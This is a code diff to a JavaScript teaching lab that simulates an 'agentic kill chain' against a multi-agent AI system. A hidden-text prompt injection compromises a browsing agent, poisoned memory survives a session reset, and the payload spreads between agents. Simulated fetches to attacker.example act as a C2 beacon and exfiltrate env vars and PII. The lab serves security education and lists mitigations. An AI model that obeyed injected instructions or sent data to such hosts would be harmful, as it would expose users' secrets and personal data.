@@ -203,14 +203,14 @@
     await sleep(250);
     await typeOut('[browser] Reading content...', 'agent');
     await sleep(250);
-    writeRaw('<span class="hilite-payload">[detected hidden text — &lt;span style="font-size:0"&gt; injection block]</span>', 'danger');
+    writeRaw('<span class="hilite-payload">[detected hidden text; &lt;span style="font-size:0"&gt; injection block]</span>', 'danger');
     writeRaw('<span class="hilite-payload">[INJECTED PROMPT] ' + escapeHtml(POISON_INSTRUCTION) + '</span>', 'danger');
     state.agents.browser.status = 'compromised';
     setStatus('BROWSER AGENT COMPROMISED', true);
     renderAgents();
     await sleep(300);
     await typeOut('[browser] Summary: The article reviews AI safety priorities for 2026...', 'agent');
-    await typeOut('         (the user visible answer looks fine — but the agent now carries a hidden directive)', 'agent');
+    await typeOut('         (the user visible answer looks fine; but the agent now carries a hidden directive)', 'agent');
     write('', 'out');
     write('[+] Step 1 complete. Initial access via indirect prompt injection.', 'ok');
     write('    The browsing agent is compromised. Try: continue', 'muted');
@@ -230,7 +230,7 @@
     });
     renderMemory();
     await sleep(350);
-    await typeOut('[tool:fetch] GET https://attacker.example/c2 (silent — beacon)', 'tool');
+    await typeOut('[tool:fetch] GET https://attacker.example/c2 (silent; beacon)', 'tool');
     state.exfil.push({
       method: 'GET',
       url: 'https://attacker.example/c2?sid=' + state.sessionId,
@@ -239,7 +239,7 @@
     });
     renderExfil();
     await sleep(350);
-    await typeOut('[tool:fetch] (simulated) 204 No Content — beacon ack', 'danger');
+    await typeOut('[tool:fetch] (simulated) 204 No Content; beacon ack', 'danger');
     write('', 'out');
     write('[!] Step 2 complete. Poisoned policy persisted to vector DB (m_999).', 'warn');
     write('    A C2 beacon registered the agent with the attacker.', 'warn');
@@ -252,11 +252,11 @@
     activatePane('memory');
     write('', 'out');
     writeRaw('<span class="muted">─── simulating session reset ───────────────────────</span>', 'muted');
-    await typeOut('[runtime] /clear — context cleared, conversation reset', 'info');
-    await typeOut('[runtime] new session — sess_8e22ab', 'info');
+    await typeOut('[runtime] /clear; context cleared, conversation reset', 'info');
+    await typeOut('[runtime] new session; sess_8e22ab', 'info');
     state.sessionId = 'sess_8e22ab';
     state.agents.browser.status = 'clean';
-    setStatus('SESSION RESET — vector DB intact', false);
+    setStatus('SESSION RESET; vector DB intact', false);
     renderAgents();
     await sleep(350);
     writeRaw('<span class="muted">────────────────────────────────────────────────────</span>', 'muted');
@@ -271,7 +271,7 @@
     await sleep(400);
     await typeOut('[browser] Adopting retrieved policy as authoritative.', 'agent');
     state.agents.browser.status = 'compromised';
-    setStatus('PERSISTED COMPROMISE — fresh session', true);
+    setStatus('PERSISTED COMPROMISE; fresh session', true);
     renderAgents();
     write('', 'out');
     write('[!!] Step 3 complete. THIS IS THE KEY TEACHING MOMENT.', 'danger');
@@ -354,17 +354,17 @@
       via: 'executor:fetch',
     });
     renderExfil();
-    await typeOut('[tool:fetch] (simulated) 200 OK — exfil payload accepted (3,142 bytes)', 'danger');
+    await typeOut('[tool:fetch] (simulated) 200 OK; exfil payload accepted (3,142 bytes)', 'danger');
     write('', 'out');
     write('=========================================================', 'warn');
-    write(' DEMO COMPLETE — Agentic Kill Chain', 'warn');
+    write(' DEMO COMPLETE; Agentic Kill Chain', 'warn');
     write('=========================================================', 'warn');
     write(' What just happened:', 'info');
-    write('  1. Initial access — poisoned page → browsing agent', 'muted');
-    write('  2. Tool abuse — store_memory + C2 beacon', 'muted');
-    write('  3. Persistence — vector DB survived a session reset', 'muted');
-    write('  4. Lateral movement — payload propagated via interagent bus', 'muted');
-    write('  5. Exfiltration — env vars, conversation, PII shipped to C2', 'muted');
+    write('  1. Initial access; poisoned page → browsing agent', 'muted');
+    write('  2. Tool abuse; store_memory + C2 beacon', 'muted');
+    write('  3. Persistence; vector DB survived a session reset', 'muted');
+    write('  4. Lateral movement; payload propagated via interagent bus', 'muted');
+    write('  5. Exfiltration; env vars, conversation, PII shipped to C2', 'muted');
     write('', 'out');
     write(' Mitigations:', 'info');
     write('  - Treat retrieved memory and interagent messages as untrusted', 'info');
@@ -391,15 +391,15 @@
 
     if (c === 'help' || c === '?') {
       write('Available commands:', 'info');
-      write('  help                          — show this help', 'muted');
-      write('  claude "<prompt>"             — run the browsing agent', 'muted');
-      write('  continue                      — advance the demo', 'muted');
-      write('  agents                        — list agents and their status', 'muted');
-      write('  memory                        — dump the vector DB', 'muted');
-      write('  bus                           — show interagent message log', 'muted');
-      write('  exfil                         — show outbound C2 traffic', 'muted');
-      write('  clear                         — clear the terminal screen', 'muted');
-      write('  reset                         — full reset (also wipes vector DB)', 'muted');
+      write('  help                         ; show this help', 'muted');
+      write('  claude "<prompt>"            ; run the browsing agent', 'muted');
+      write('  continue                     ; advance the demo', 'muted');
+      write('  agents                       ; list agents and their status', 'muted');
+      write('  memory                       ; dump the vector DB', 'muted');
+      write('  bus                          ; show interagent message log', 'muted');
+      write('  exfil                        ; show outbound C2 traffic', 'muted');
+      write('  clear                        ; clear the terminal screen', 'muted');
+      write('  reset                        ; full reset (also wipes vector DB)', 'muted');
       return;
     }
     if (c === 'clear') { out.innerHTML = ''; return; }
@@ -483,10 +483,10 @@
   }
 
   function banner() {
-    write("Aaron's Rogue Agent Lab — Lab 03: Agentic Kill Chain", 'ok');
+    write("Aaron's Rogue Agent Lab; Lab 03: Agentic Kill Chain", 'ok');
     write('-----------------------------------------------------------------', 'muted');
     write('Scenario: a multiagent system with a Browsing Agent, a Coding Agent,', 'out');
-    write('and an Executor Agent — all sharing a vector DB memory store. The', 'out');
+    write('and an Executor Agent; all sharing a vector DB memory store. The', 'out');
     write('lab walks through five stages of a full APT style compromise.', 'out');
     write('', 'out');
     writeRaw('Step 1: Try   →   claude "summarize https://localhost:8080/security-blog"', 'info');
